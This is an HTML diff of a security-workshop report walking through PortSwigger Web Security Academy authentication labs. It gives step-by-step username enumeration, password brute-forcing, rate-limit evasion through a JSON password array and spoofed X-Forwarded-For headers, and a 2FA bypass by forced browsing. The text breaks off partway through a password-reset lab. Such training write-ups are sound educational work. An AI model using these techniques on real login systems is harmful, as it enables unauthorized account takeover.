@@ -1,0 +1,946 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+  <meta name="robots" content="index, follow">
+
+  <title>Day 8: PortSwigger Web Security Academy Authentication Deep Dive & Password Reset Exploitation | BugXploit Workshop | The WH2</title>
+  <meta name="description"
+    content="Day 8 comprehensive penetration testing report from BugXploit (Koteshwor): PortSwigger Web Security Academy authentication labs breakdown. Username enumeration via response length/message differences, bypassing IP rate-limiting via multiple credentials JSON array injection, 2FA simple bypass via forced browsing, broken password reset logic via token stripping, and Host header password reset poisoning via middleware.">
+  <meta name="keywords"
+    content="PortSwigger Web Security Academy, Authentication Vulnerabilities, Username Enumeration via Different Responses, Broken Brute-Force Protection Multiple Credentials Per Request, 2FA Simple Bypass, Password Reset Broken Logic, Password Reset Poisoning via Middleware, X-Forwarded-Host injection, Burp Suite Intruder Sniper, Burp Repeater JSON array brute force, Burp Suite, Ethical Hacking Day 8, BugXploit Workshop, Birendra Sah, Bishal Shrestha, Chandan Kumar Thakur, The WH2, Penetration Testing Nepal">
+  <meta name="author" content="Chandan Kumar Thakur (The WH2)">
+
+  <link rel="canonical"
+    href="https://www.chandankumarthakur.com.np/knowledge/ethical-hacking-and-penetration-testing/day8/">
+
+  <!-- Open Graph / Meta Consistency -->
+  <meta property="og:title"
+    content="Day 8: Authentication Vulnerabilities, Rate-Limit Bypass & Password Reset Poisoning | BugXploit Workshop">
+  <meta property="og:description"
+    content="Exhaustive Day 8 lab report: PortSwigger Web Security Academy authentication labs solved in depth. Username enumeration, JSON array brute-force rate-limit bypass, 2FA forced browsing, token stripping, and Host header poisoning.">
+  <meta property="og:image" content="https://www.chandankumarthakur.com.np/assets/img/wh2.jpg">
+  <meta property="og:url"
+    content="https://www.chandankumarthakur.com.np/knowledge/ethical-hacking-and-penetration-testing/day8/">
+  <meta property="og:type" content="article">
+  <meta property="og:site_name" content="The WH2 Knowledge Hub">
+
+  <!-- Twitter Meta Tags -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Day 8: PortSwigger Authentication Vulnerabilities Deep Dive | BugXploit">
+  <meta name="twitter:description"
+    content="Comprehensive Day 8 report: PortSwigger authentication labs, rate-limit evasion via JSON arrays, 2FA bypass, and password reset poisoning via middleware. Documented by The WH2.">
+  <meta name="twitter:image" content="https://www.chandankumarthakur.com.np/assets/img/wh2.jpg">
+
+  <!-- JSON-LD TechArticle Schema for Search Engines and AI Crawlers -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "TechArticle",
+    "headline": "Day 8: PortSwigger Web Security Academy Authentication Deep Dive & Password Reset Exploitation - BugXploit Workshop",
+    "description": "Exhaustive technical penetration testing report covering five critical authentication labs from PortSwigger Web Security Academy: (1) Username enumeration via different responses and response lengths using Burp Suite Intruder Sniper; (2) Broken brute-force protection bypassed by submitting multiple candidate credentials simultaneously inside a JSON array payload; (3) Two-Factor Authentication (2FA) simple bypass via flawed session state and forced browsing to /my-account; (4) Password reset broken logic via parameter tampering and token deletion; and (5) Password reset poisoning via middleware using X-Forwarded-Host header manipulation and out-of-band token exfiltration.",
+    "about": [
+      {
+        "@type": "SoftwareApplication",
+        "name": "PortSwigger Web Security Academy"
+      },
+      {
+        "@type": "SoftwareApplication",
+        "name": "Burp Suite"
+      },
+      {
+        "@type": "Thing",
+        "name": "Authentication Vulnerabilities (CWE-287, CWE-307)"
+      },
+      {
+        "@type": "Thing",
+        "name": "Password Reset Poisoning via Host Header (CWE-640)"
+      },
+      {
+        "@type": "Thing",
+        "name": "Two-Factor Authentication (2FA) Bypass"
+      }
+    ],
+    "author": {
+      "@type": "Person",
+      "name": "Chandan Kumar Thakur",
+      "alternateName": "The WH2",
+      "jobTitle": "AI Architect & Cybersecurity Researcher",
+      "url": "https://www.chandankumarthakur.com.np/",
+      "sameAs": [
+        "https://www.linkedin.com/in/thewh2/",
+        "https://github.com/thewh2"
+      ]
+    },
+    "contributor": [
+      {
+        "@type": "Person",
+        "name": "Birendra Sah",
+        "jobTitle": "Offensive Security Trainer & Cybersecurity Instructor",
+        "sameAs": "https://www.linkedin.com/in/birendrasah4u2/"
+      },
+      {
+        "@type": "Person",
+        "name": "Bishal Shrestha",
+        "jobTitle": "Security Researcher & Penetration Testing Specialist",
+        "sameAs": "https://www.linkedin.com/in/bishal0x01/"
+      }
+    ],
+    "publisher": {
+      "@type": "Organization",
+      "name": "The WH2",
+      "url": "https://www.chandankumarthakur.com.np/",
+      "logo": {
+        "@type": "ImageObject",
+        "url": "https://www.chandankumarthakur.com.np/assets/img/wh2.jpg"
+      }
+    },
+    "educationalLevel": "Intermediate to Advanced",
+    "inLanguage": "en",
+    "datePublished": "2026-09-16",
+    "dateModified": "2026-09-16",
+    "mainEntityOfPage": "https://www.chandankumarthakur.com.np/knowledge/ethical-hacking-and-penetration-testing/day8/"
+  }
+  </script>
+
+  <!-- Favicons -->
+  <link href="../../../assets/img/favicon.png" rel="icon">
+  <link href="../../../assets/img/apple-touch-icon.png" rel="apple-touch-icon">
+
+  <!-- Google Fonts -->
+  <link
+    href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i"
+    rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+  <!-- Vendor CSS Files -->
+  <link href="../../../assets/vendor/aos/aos.css" rel="stylesheet">
+  <link href="../../../assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <link href="../../../assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
+  <link href="../../../assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
+  <link href="../../../assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
+  <link href="../../../assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">
+
+  <!-- Template Main CSS File -->
+  <link href="../../../assets/css/style.css" rel="stylesheet">
+
+  <style>
+    .lesson-article h2 {
+      color: #173b6c;
+      font-size: 22px;
+      font-weight: 700;
+      margin-top: 35px;
+      margin-bottom: 16px;
+      padding-bottom: 8px;
+      border-bottom: 2px solid #eef3f7;
+    }
+
+    .lesson-article h3 {
+      color: #2c4964;
+      font-size: 18px;
+      font-weight: 600;
+      margin-top: 25px;
+      margin-bottom: 12px;
+    }
+
+    .lesson-article h4 {
+      color: #3f6586;
+      font-size: 16px;
+      font-weight: 600;
+      margin-top: 18px;
+      margin-bottom: 8px;
+    }
+
+    .lesson-article p,
+    .lesson-article li {
+      font-size: 15.5px;
+      line-height: 1.75;
+      color: #333;
+    }
+
+    .lesson-article pre {
+      background: #1e1e1e;
+      color: #d4d4d4;
+      padding: 18px 20px;
+      border-radius: 8px;
+      font-family: 'Fira Code', Consolas, Monaco, monospace;
+      font-size: 13px;
+      overflow-x: auto;
+      margin: 18px 0;
+      border: 1px solid #333;
+      position: relative;
+    }
+
+    .lesson-article code {
+      font-family: 'Fira Code', Consolas, Monaco, monospace;
+      background: #eef2f7;
+      color: #b02a37;
+      padding: 2px 6px;
+      border-radius: 4px;
+      font-size: 13.5px;
+    }
+
+    .lesson-article pre code {
+      background: transparent;
+      color: inherit;
+      padding: 0;
+    }
+
+    .callout-box {
+      background: #eef7fc;
+      border-left: 4px solid #149ddd;
+      padding: 16px 20px;
+      border-radius: 0 8px 8px 0;
+      margin: 22px 0;
+    }
+
+    .callout-box.security-notice {
+      background: rgba(239, 68, 68, 0.08);
+      border-left-color: #ef4444;
+    }
+
+    .callout-box.security-notice h4 {
+      color: #b91c1c;
+      font-size: 16px;
+      font-weight: 700;
+      margin-bottom: 6px;
+    }
+
+    .callout-warning {
+      background: #fff8e6;
+      border-left: 4px solid #ffc107;
+      padding: 16px 20px;
+      border-radius: 0 8px 8px 0;
+      margin: 22px 0;
+    }
+
+    .callout-danger {
+      background: #fdf2f2;
+      border-left: 4px solid #dc3545;
+      padding: 16px 20px;
+      border-radius: 0 8px 8px 0;
+      margin: 22px 0;
+    }
+
+    .callout-success {
+      background: #f0fbf4;
+      border-left: 4px solid #198754;
+      padding: 16px 20px;
+      border-radius: 0 8px 8px 0;
+      margin: 22px 0;
+    }
+
+    .lesson-nav-buttons {
+      display: flex;
+      justify-content: space-between;
+      gap: 15px;
+      margin-top: 45px;
+      padding-top: 25px;
+      border-top: 1px solid #eef3f7;
+    }
+
+    .code-block-wrapper {
+      position: relative;
+    }
+
+    .code-copy-btn {
+      position: absolute;
+      top: 10px;
+      right: 12px;
+      background: rgba(255, 255, 255, 0.15);
+      border: 1px solid rgba(255, 255, 255, 0.25);
+      color: #e0e0e0;
+      padding: 4px 10px;
+      font-size: 12px;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      z-index: 5;
+    }
+
+    .code-copy-btn:hover {
+      background: #149ddd;
+      color: #fff;
+      border-color: #149ddd;
+    }
+
+    .code-copy-btn.copied {
+      background: #28a745;
+      color: #fff;
+      border-color: #28a745;
+    }
+
+    .terminal-window {
+      background: #0d1117;
+      border-radius: 8px;
+      border: 1px solid #30363d;
+      margin: 20px 0;
+      overflow: hidden;
+      font-family: 'Fira Code', monospace;
+    }
+
+    .terminal-header {
+      background: #161b22;
+      padding: 8px 14px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      border-bottom: 1px solid #30363d;
+    }
+
+    .terminal-circle {
+      width: 11px;
+      height: 11px;
+      border-radius: 50%;
+    }
+
+    .tc-red { background: #ff5f56; }
+    .tc-yellow { background: #ffbd2e; }
+    .tc-green { background: #27c93f; }
+
+    .terminal-title {
+      color: #8b949e;
+      font-size: 12px;
+      margin-left: 6px;
+    }
+
+    .terminal-body {
+      padding: 16px;
+      color: #c9d1d9;
+      font-size: 13px;
+      line-height: 1.6;
+    }
+
+    .prompt-symbol {
+      color: #58a6ff;
+      font-weight: bold;
+    }
+
+    .command-output {
+      color: #8b949e;
+    }
+
+    .lab-card {
+      border: 1px solid #e1e4e8;
+      border-radius: 8px;
+      padding: 20px;
+      margin-bottom: 24px;
+      background: #ffffff;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.04);
+      transition: all 0.2s ease;
+    }
+    .lab-card:hover {
+      box-shadow: 0 6px 18px rgba(0, 0, 0, 0.08);
+      border-color: #149ddd;
+    }
+
+    .badge-apprentice {
+      background-color: #0d6efd;
+      color: #fff;
+    }
+    .badge-practitioner {
+      background-color: #fd7e14;
+      color: #fff;
+    }
+    .badge-expert {
+      background-color: #dc3545;
+      color: #fff;
+    }
+  </style>
+</head>
+
+<body class="knowledge-page">
+
+  <main id="main">
+
+    <!-- ======= Breadcrumbs ======= -->
+    <section id="breadcrumbs" class="breadcrumbs">
+      <div class="container">
+        <div class="d-flex justify-content-between align-items-center">
+          <h2>Day 8: PortSwigger Authentication &amp; Password Reset Exploits</h2>
+          <ol>
+            <li><a href="../../../index.html">Home</a></li>
+            <li><a href="../../index.html">Knowledge</a></li>
+            <li><a href="../index.html">Ethical Hacking</a></li>
+            <li>Day 8 Report</li>
+          </ol>
+        </div>
+      </div>
+    </section><!-- End Breadcrumbs -->
+
+    <!-- ======= Lesson Detailed Content ======= -->
+    <section class="knowledge-section">
+      <div class="container" data-aos="fade-up">
+
+        <div class="row">
+          <div class="col-lg-9 mx-auto">
+
+            <article class="lesson-article">
+
+              <!-- Article Header / Meta -->
+              <div class="border-bottom pb-3 mb-4">
+                <div class="d-flex flex-wrap gap-2 mb-2">
+                  <span class="badge bg-primary">Session 08 / 14</span>
+                  <span class="badge bg-dark">BugXploit Workshop</span>
+                </div>
+                <h1 class="fw-bold" style="color: #173b6c; font-size: 28px; line-height: 1.3;">
+                  Day 8: PortSwigger Web Security Academy Authentication Deep Dive &amp; Password Reset Exploitation
+                </h1>
+                <div class="text-muted d-flex flex-wrap gap-3 mt-2 small align-items-center">
+                  <span><i class="bi bi-person-circle text-primary"></i> <strong>Report By:</strong> TheWH2</span>
+                  <span>
+                    <i class="bi bi-person-video3 text-primary"></i> <strong>Instructors:</strong>
+                    <a href="https://www.linkedin.com/in/birendrasah4u2/" target="_blank" rel="noopener noreferrer"
+                      class="text-primary fw-semibold">
+                      Birendra Sah <i class="bi bi-linkedin" style="font-size: 12px;"></i>
+                    </a>
+                    &bull;
+                    <a href="https://www.linkedin.com/in/bishal0x01/" target="_blank" rel="noopener noreferrer"
+                      class="text-primary fw-semibold">
+                      Bishal Shrestha <i class="bi bi-linkedin" style="font-size: 12px;"></i>
+                    </a>
+                  </span>
+                  <span><i class="bi bi-building text-primary"></i> <strong>Institute:</strong> BugXploit (Koteshwor)</span>
+                  <span><i class="bi bi-clock text-primary"></i> <strong>Read Time:</strong> ~22 mins</span>
+                </div>
+              </div>
+
+              <!-- Content Body -->
+              <div class="article-content">
+
+                <!-- Alert/Notice Box -->
+                <div class="callout-box security-notice">
+                  <h4><i class="bi bi-shield-exclamation"></i> Security Notice &amp; Lab Scope</h4>
+                  <p class="mb-0 small">
+                    This documentation captures official, hands-on penetration testing training conducted during Day 8 of the Ethical Hacking and Penetration Testing Workshop at <strong>BugXploit</strong> (Koteshwor, Kathmandu). All authentication attacks, brute-force bypasses, 2FA circumventions, and password reset poisoning proof-of-concepts were executed in authorized laboratory environments hosted by the <strong>PortSwigger Web Security Academy</strong>. Attempting credential stuffing, unauthorized account takeovers, or Host header manipulation against live production web systems without explicit authorization is illegal under the Electronic Transactions Act (ETA) of Nepal and international cyber law.
+                  </p>
+                </div>
+
+                <!-- Table of Contents -->
+                <div class="card mb-4 border-light shadow-sm" style="background: #fafcfe;">
+                  <div class="card-body">
+                    <h5 class="fw-bold mb-3" style="color: #173b6c;"><i class="bi bi-list-nested"></i> Table of Contents</h5>
+                    <div class="row">
+                      <div class="col-md-6">
+                        <ul class="mb-0" style="font-size: 14.5px; line-height: 1.9;">
+                          <li><a href="#authentication-flaws-overview" class="text-decoration-none">1. Anatomy of Enterprise Authentication Flaws</a></li>
+                          <li><a href="#lab1-username-enumeration" class="text-decoration-none">2. Lab 1: Username Enumeration via Response Differences</a></li>
+                          <li><a href="#rate-limiting-mechanisms" class="text-decoration-none">3. Defensive Rate-Limiting &amp; Evasion Strategies</a></li>
+                          <li><a href="#lab2-multiple-credentials-json" class="text-decoration-none">4. Lab 2: Bypassing Rate Limits via Multiple Credentials (JSON Array)</a></li>
+                          <li><a href="#two-factor-auth-mechanics" class="text-decoration-none">5. Two-Factor Authentication (2FA) Architecture &amp; Attack Vectors</a></li>
+                        </ul>
+                      </div>
+                      <div class="col-md-6">
+                        <ul class="mb-0" style="font-size: 14.5px; line-height: 1.9;">
+                          <li><a href="#lab3-2fa-simple-bypass" class="text-decoration-none">6. Lab 3: 2FA Simple Bypass via Forced Browsing</a></li>
+                          <li><a href="#lab4-password-reset-broken-logic" class="text-decoration-none">7. Lab 4: Password Reset Broken Logic (Token Stripping)</a></li>
+                          <li><a href="#host-header-middleware-mechanics" class="text-decoration-none">8. Host Header Injection &amp; Reverse Proxy Middleware</a></li>
+                          <li><a href="#lab5-password-reset-poisoning" class="text-decoration-none">9. Lab 5: Password Reset Poisoning via Middleware</a></li>
+                          <li><a href="#enterprise-defense" class="text-decoration-none">10. Defense-in-Depth &amp; Remediation Architecture</a></li>
+                          <li><a href="#day8-takeaways" class="text-decoration-none">11. Day 8 Summary &amp; Key Takeaways</a></li>
+                        </ul>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+
+                <!-- Section 1 -->
+                <h2 id="authentication-flaws-overview">1. Anatomy of Enterprise Authentication Flaws</h2>
+                <p>
+                  Authentication is the critical gatekeeper of any modern application. When authentication mechanisms are flawed, attackers can bypass identity verification entirely, gaining administrative privileges, accessing confidential data, and impersonating legitimate users.
+                </p>
+                <p>
+                  On Day 8 of the BugXploit workshop, the mentors led the cohort through deep practical exploitation of real-world authentication mechanisms on the <strong>PortSwigger Web Security Academy</strong>. Authentication flaws rarely stem from broken cryptographic algorithms; rather, they arise from <strong>subtle logical errors</strong>, <strong>inconsistent error handling</strong>, <strong>flawed rate-limiting state machines</strong>, and <strong>insecure reverse proxy interactions</strong>.
+                </p>
+
+                <!-- Section 2: Lab 1 -->
+                <h2 id="lab1-username-enumeration">2. Lab 1: Username Enumeration via Response Differences</h2>
+                
+                <div class="lab-card">
+                  <div class="d-flex justify-content-between align-items-center mb-2">
+                    <span class="badge badge-apprentice">Apprentice Lab</span>
+                    <a href="https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses" target="_blank" rel="noopener noreferrer" class="small text-decoration-none fw-bold">
+                      View Official Lab <i class="bi bi-box-arrow-up-right"></i>
+                    </a>
+                  </div>
+                  <h4 class="fw-bold text-primary mb-2">Lab: Username enumeration via different responses</h4>
+                  <p class="small text-muted mb-0">
+                    <strong>Vulnerability:</strong> The application returns subtly distinct error messages and response byte lengths depending on whether the submitted username exists in the database.
+                  </p>
+                </div>
+
+                <h3>The Technical Problem</h3>
+                <p>
+                  Secure authentication endpoints must treat invalid login attempts with identical ambiguity: <em>"Invalid username or password"</em>. However, legacy or improperly designed login handlers evaluate credentials in two distinct logical branches:
+                </p>
+                <ol>
+                  <li>Check if the username exists in the database. If not found, abort immediately with <code>Invalid username</code>.</li>
+                  <li>If the username exists, verify the password hash. If incorrect, abort with <code>Incorrect password</code>.</li>
+                </ol>
+                <p>
+                  This procedural leakage allows an attacker to separate the credential auditing process into two phases: first discovering a valid username, and second, focusing computational brute-force power exclusively against that confirmed account.
+                </p>
+
+                <h3>Step-by-Step Exploitation in Burp Suite</h3>
+                <ol>
+                  <li>
+                    <strong>Capture Baseline Request:</strong> Submit an intentional invalid login (e.g., <code>username=testuser&amp;password=testpass</code>). In Burp Suite, navigate to <code>Proxy &gt; HTTP history</code> and locate the <code>POST /login</code> request.
+                  </li>
+                  <li>
+                    <strong>Send to Burp Intruder:</strong> Press <code>Ctrl + I</code> to send the request to Intruder.
+                  </li>
+                  <li>
+                    <strong>Configure Payload Positions (Sniper Attack):</strong> Set the attack type to <strong>Sniper</strong>. Clear default payload markers and assign a single marker to the username value:
+                    <pre><code>POST /login HTTP/1.1
+Host: &lt;target-lab-id&gt;.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+
+csrf=xxxxxx&amp;username=§testuser§&amp;password=staticpassword</code></pre>
+                  </li>
+                  <li>
+                    <strong>Load Candidate Usernames:</strong> Under the <em>Payloads</em> tab, paste the wordlist of candidate usernames. Start the attack.
+                  </li>
+                  <li>
+                    <strong>Analyze Response Length &amp; Content:</strong> Sort the Intruder results table by the <strong>Length</strong> column. 
+                    Notice that one payload yields a slightly longer response length (e.g., <strong>3,330 bytes</strong> vs 3,312 bytes). Inspecting the response reveals the message:
+                    <pre><code>&lt;p class=is-warning&gt;Incorrect password&lt;/p&gt;</code></pre>
+                    whereas every other payload returned:
+                    <pre><code>&lt;p class=is-warning&gt;Invalid username&lt;/p&gt;</code></pre>
+                    <strong>Discovered Valid Username:</strong> <code>ao</code>.
+                  </li>
+                  <li>
+                    <strong>Phase 2: Brute-Forcing the Password:</strong> Return to Intruder positions. Set the username statically to <code>ao</code> and position the payload marker on the password field:
+                    <pre><code>csrf=xxxxxx&amp;username=ao&amp;password=§testpassword§</code></pre>
+                  </li>
+                  <li>
+                    <strong>Execute Password Attack:</strong> Load the candidate passwords wordlist and launch the attack. Every invalid password returns an HTTP <code>200 OK</code> response. Exactly one request returns an <strong>HTTP <code>302 Found</code></strong> redirection with a <code>Set-Cookie: session=...</code> header.
+                  </li>
+                  <li>
+                    <strong>Target Compromised:</strong> Discovered valid password: <code>jessica</code>. Logging in as <code>ao:jessica</code> successfully solves the lab.
+                  </li>
+                </ol>
+
+                <!-- Section 3 -->
+                <h2 id="rate-limiting-mechanisms">3. Defensive Rate-Limiting &amp; Evasion Strategies</h2>
+                <p>
+                  To prevent attackers from running dictionary attacks, enterprise web applications deploy <strong>Rate Limiting</strong> and <strong>Account Lockout</strong> mechanisms:
+                </p>
+                <ul>
+                  <li><strong>IP-Based Rate Limiting:</strong> Blocking or throttling any client IP address that sends more than 3 to 5 failed login attempts within a specific time window.</li>
+                  <li><strong>Account Lockout:</strong> Temporarily disabling the user account after 3 to 5 incorrect password submissions.</li>
+                </ul>
+
+                <p>
+                  However, rate limiters frequently suffer from design limitations that attackers can exploit:
+                </p>
+                <div class="row g-3 my-2">
+                  <div class="col-md-4">
+                    <div class="card h-100 p-3 bg-light border-0 shadow-sm">
+                      <h6 class="fw-bold text-primary mb-1">1. IP Spoofing Headers</h6>
+                      <p class="small text-muted mb-0">
+                        If the rate-limiter relies on reverse-proxy headers without filtering, injecting headers like <code>X-Forwarded-For: 127.0.0.1</code>, <code>X-Real-IP</code>, or <code>Client-IP</code> can fool the server into treating each request as originating from a new client.
+                      </p>
+                    </div>
+                  </div>
+                  <div class="col-md-4">
+                    <div class="card h-100 p-3 bg-light border-0 shadow-sm">
+                      <h6 class="fw-bold text-primary mb-1">2. Low-and-Slow Spraying</h6>
+                      <p class="small text-muted mb-0">
+                        Password spraying tests 1 password across thousands of usernames rather than thousands of passwords against 1 user, remaining below per-account threshold limits.
+                      </p>
+                    </div>
+                  </div>
+                  <div class="col-md-4">
+                    <div class="card h-100 p-3 bg-light border-0 shadow-sm">
+                      <h6 class="fw-bold text-primary mb-1">3. Batch Request Injection</h6>
+                      <p class="small text-muted mb-0">
+                        Submitting an array of candidate passwords within a single HTTP request packet, allowing the attacker to test 100+ passwords while only registering 1 single request counter at the rate limiter.
+                      </p>
+                    </div>
+                  </div>
+                </div>
+
+                <!-- Section 4: Lab 2 -->
+                <h2 id="lab2-multiple-credentials-json">4. Lab 2: Bypassing Rate Limits via Multiple Credentials (JSON Array)</h2>
+
+                <div class="lab-card">
+                  <div class="d-flex justify-content-between align-items-center mb-2">
+                    <span class="badge badge-expert">Expert Lab</span>
+                    <a href="https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request" target="_blank" rel="noopener noreferrer" class="small text-decoration-none fw-bold">
+                      View Official Lab <i class="bi bi-box-arrow-up-right"></i>
+                    </a>
+                  </div>
+                  <h4 class="fw-bold text-primary mb-2">Lab: Broken brute-force protection, multiple credentials per request</h4>
+                  <p class="small text-muted mb-0">
+                    <strong>Vulnerability:</strong> The login API accepts credentials as a JSON object. The backend parser supports array structures for the password parameter, iterating over each password while the rate-limiter only tallies single incoming HTTP requests.
+                  </p>
+                </div>
+
+                <h3>The Real-World Scenario &amp; Logic Flaw</h3>
+                <p>
+                  In this lab, entering more than 3 failed attempts from an IP results in an immediate block: <em>"You have made too many incorrect login attempts. Please try again in 1 minute."</em> A standard Burp Intruder attack fails because the scanner triggers the rate limiter on request #4.
+                </p>
+                <p>
+                  However, inspecting the request body reveals that authentication is handled by a modern JSON endpoint:
+                </p>
+                <pre><code>POST /login HTTP/2
+Host: &lt;target-lab-id&gt;.web-security-academy.net
+Content-Type: application/json
+
+{"username":"carlos","password":"invalidpassword"}</code></pre>
+                <p>
+                  Because of sloppy type-checking in the backend authentication routine (common in Node.js, Python, or PHP backends), the server expects <code>password</code> to be a string, but if an <strong>array of strings</strong> is provided, the backend executes a loop:
+                </p>
+                <pre><code>// Flawed Backend Conceptual Logic
+for (let pass of request.body.password) {
+    if (verifyPassword(request.body.username, pass)) {
+        return createSession(request.body.username); // Logs in on first match!
+    }
+}
+return error("Invalid credentials");</code></pre>
+
+                <h3>Exploitation Walkthrough</h3>
+                <ol>
+                  <li>Capture the <code>POST /login</code> JSON request in Burp Suite and send it to <strong>Burp Repeater</strong> (<code>Ctrl + R</code>).</li>
+                  <li>
+                    Replace the single password string with a complete JSON array containing all 100+ candidate passwords provided by the lab:
+                    <div class="terminal-window">
+                      <div class="terminal-header">
+                        <span class="terminal-circle tc-red"></span>
+                        <span class="terminal-circle tc-yellow"></span>
+                        <span class="terminal-circle tc-green"></span>
+                        <span class="terminal-title">Burp Repeater: JSON Batch Payload</span>
+                      </div>
+                      <div class="terminal-body">
+                        POST /login HTTP/2<br>
+                        Host: 0a1f00c90352f3e4821c8da400c9002f.web-security-academy.net<br>
+                        Content-Type: application/json<br>
+                        Cookie: session=tc5vIGDaX8RP9ycnF62WGm4yIfhsG7X2<br><br>
+                        {"username":"carlos","password":[<br>
+                        &nbsp;&nbsp;"123456",<br>
+                        &nbsp;&nbsp;"password",<br>
+                        &nbsp;&nbsp;"12345678",<br>
+                        &nbsp;&nbsp;"qwerty",<br>
+                        &nbsp;&nbsp;...<br>
+                        &nbsp;&nbsp;"montana",<br>
+                        &nbsp;&nbsp;"moon",<br>
+                        &nbsp;&nbsp;"moscow"<br>
+                        ]}
+                      </div>
+                    </div>
+                  </li>
+                  <li>
+                    <strong>Dispatch Single Request:</strong> Click <strong>Send</strong>. Because only <strong>one single HTTP request</strong> is transmitted, the rate-limiter counts <code>1 / 3</code> requests and does NOT trigger an IP block!
+                  </li>
+                  <li>
+                    <strong>Immediate Success Response:</strong> The server iterates through the array, encounters the correct password, and responds with:
+                    <pre><code>HTTP/2 302 Found
+Location: /my-account?id=carlos
+Set-Cookie: session=zXDZ44Wiyy9FCEfgcs3G2sSC98nJfHNz; Secure; HttpOnly; SameSite=None
+X-Frame-Options: SAMEORIGIN
+Content-Length: 0</code></pre>
+                  </li>
+                  <li>
+                    <strong>Browser Session Takeover:</strong> Right-click the response in Burp Repeater &gt; select <strong>Show response in browser</strong> &gt; copy the generated URL &gt; paste it into your browser. You are instantly authenticated into Carlos's administrative account.
+                  </li>
+                </ol>
+
+                <!-- Section 5 -->
+                <h2 id="two-factor-auth-mechanics">5. Two-Factor Authentication (2FA) Architecture &amp; Attack Vectors</h2>
+                <p>
+                  Two-Factor Authentication (2FA) requires users to provide two distinct authentication factors: something they <strong>know</strong> (password) and something they <strong>have</strong> (SMS OTP, Authenticator app TOTP, hardware key).
+                </p>
+                <p>
+                  Common architectural flaws in 2FA implementations include:
+                </p>
+                <ul>
+                  <li><strong>Flawed State Transitions:</strong> Creating the fully authenticated user session immediately upon Stage 1 (password verification) instead of waiting for Stage 2 (2FA code validation).</li>
+                  <li><strong>Leaking OTPs in Responses:</strong> Returning the generated verification code inside the JSON response of the <code>/send-2fa</code> API call for frontend validation.</li>
+                  <li><strong>Brute-Forceable OTPs:</strong> Generating short 4-digit codes (0000–9999) without rate limiting, allowing automated brute-forcing in under 10 seconds.</li>
+                  <li><strong>Channel Compromise:</strong> Email-based 2FA offers zero security if the attacker already has access to the user's email account. SMS-based 2FA is vulnerable to SIM swapping and SS7 attacks. Hardware authenticators (YubiKey / WebAuthn) offer the highest resilience.</li>
+                </ul>
+
+                <!-- Section 6: Lab 3 -->
+                <h2 id="lab3-2fa-simple-bypass">6. Lab 3: 2FA Simple Bypass via Forced Browsing</h2>
+
+                <div class="lab-card">
+                  <div class="d-flex justify-content-between align-items-center mb-2">
+                    <span class="badge badge-apprentice">Apprentice Lab</span>
+                    <a href="https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-simple-bypass" target="_blank" rel="noopener noreferrer" class="small text-decoration-none fw-bold">
+                      View Official Lab <i class="bi bi-box-arrow-up-right"></i>
+                    </a>
+                  </div>
+                  <h4 class="fw-bold text-primary mb-2">Lab: 2FA simple bypass</h4>
+                  <p class="small text-muted mb-0">
+                    <strong>Vulnerability:</strong> The application fails to enforce completion of the 2FA stage before authorizing access to authenticated endpoints.
+                  </p>
+                </div>
+
+                <h3>Step-by-Step Exploitation</h3>
+                <ol>
+                  <li>
+                    <strong>Observe Normal Baseline:</strong> Log in with your own credentials (<code>wiener:peter</code>). You are redirected to <code>/login2</code> and prompted for a 4-digit 2FA code. Open your email client, retrieve the code, submit it, and observe that your browser lands on:
+                    <pre><code>GET /my-account?id=wiener</code></pre>
+                  </li>
+                  <li><strong>Log Out:</strong> Terminate your session.</li>
+                  <li>
+                    <strong>Initiate Target Login:</strong> Log in with victim credentials (<code>carlos:montoya</code>). The server validates the password and redirects your browser to the 2FA verification prompt at <code>/login2</code>.
+                  </li>
+                  <li>
+                    <strong>Execute Forced Browsing Bypass:</strong> Without submitting any 2FA code, simply modify the browser URL bar directly to:
+                    <pre><code>https://&lt;target-lab-id&gt;.web-security-academy.net/my-account</code></pre>
+                  </li>
+                  <li>
+                    <strong>Vulnerability Confirmation:</strong> The server checks the session cookie, verifies that the user successfully completed password authentication, but <strong>fails to check whether the 2FA state flag was validated</strong>. The account dashboard immediately loads, solving the lab.
+                  </li>
+                </ol>
+
+                <!-- Section 7: Lab 4 -->
+                <h2 id="lab4-password-reset-broken-logic">7. Lab 4: Password Reset Broken Logic (Token Stripping)</h2>
+
+                <div class="lab-card">
+                  <div class="d-flex justify-content-between align-items-center mb-2">
+                    <span class="badge badge-apprentice">Apprentice Lab</span>
+                    <a href="https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic" target="_blank" rel="noopener noreferrer" class="small text-decoration-none fw-bold">
+                      View Official Lab <i class="bi bi-box-arrow-up-right"></i>
+                    </a>
+                  </div>
+                  <h4 class="fw-bold text-primary mb-2">Lab: Password reset broken logic</h4>
+                  <p class="small text-muted mb-0">
+                    <strong>Vulnerability:</strong> The password reset confirmation routine relies on a client-submitted hidden form parameter rather than binding the reset token to the target account.
+                  </p>
+                </div>
+
+                <h3>Step-by-Step Exploitation</h3>
+                <ol>
+                  <li>
+                    <strong>Trigger Reset on Controlled Account:</strong> Click <em>Forgot password?</em> and submit <code>wiener</code>. Access the email client and click the delivered password reset link.
+                  </li>
+                  <li>
